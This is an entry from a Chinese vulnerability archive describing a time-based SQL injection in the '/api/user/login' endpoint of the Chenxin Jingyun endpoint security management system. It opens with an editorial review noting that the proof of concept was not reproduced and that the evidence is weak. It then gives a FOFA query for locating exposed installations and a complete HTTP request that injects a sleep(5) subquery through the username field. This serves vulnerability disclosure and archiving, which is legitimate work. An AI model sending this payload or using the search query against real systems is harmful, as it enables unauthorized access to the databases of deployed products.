---
source: "wy876 漏洞文库"
id: "vw-c916a0228d2213e9914ed089"
entity_id: "ve-c916a0228d2213e9914ed089"
schema_version: "1"
title: "辰信景云终端安全管理系统 login 存在SQL注入漏洞"
product: "辰信景云终端安全管理"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "captcha空、password摘要，MySQL sleep；版本未知"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91/%E8%BE%B0%E4%BF%A1%E6%99%AF%E4%BA%91%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9Flogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/mdnxgki42lxoaomn"
source_status: "recorded"
---

# 辰信景云终端安全管理系统 login 存在SQL注入漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：辰信景云终端安全管理
- 本文讨论：api/user/login username SQL注入
- 版本、权限与配置前提：captcha空、password摘要，MySQL sleep；版本未知
- 资料类型：登录SQL延时请求；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 只有一个延时请求没有阴性基线/响应，验证码前置是否检查未说明
- 漏洞复习为标题错字，影响版本仅产品名
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 延时探针会占用线程或数据库连接；需记录基线和对照，单次慢响应或超时不足判定注入

### 待核与来源

- 鉴权/验证码执行顺序、数据库与版本待核
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
<font style="color:rgb(34, 34, 34);">辰信景云终端安全管理系统是辰信领创推出的新一代企业级反病毒安全防护软件， 为企业提供了一套专业可信赖的全方位终端安全解决方案。辰信景云终端安全管理系统 login 存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。</font>

# <font style="color:rgb(34, 34, 34);">二、影响版本</font>
+ <font style="color:rgb(34, 34, 34);">辰信景云终端安全管理系统</font>

# <font style="color:rgb(34, 34, 34);">三、资产测绘</font>
+ fofa`app="辰信领创-景云终端安全管理系统"`
+ 特征


# 四、漏洞复习
```http
POST /api/user/login HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 102

captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(5))a)='
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/mdnxgki42lxoaomn>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
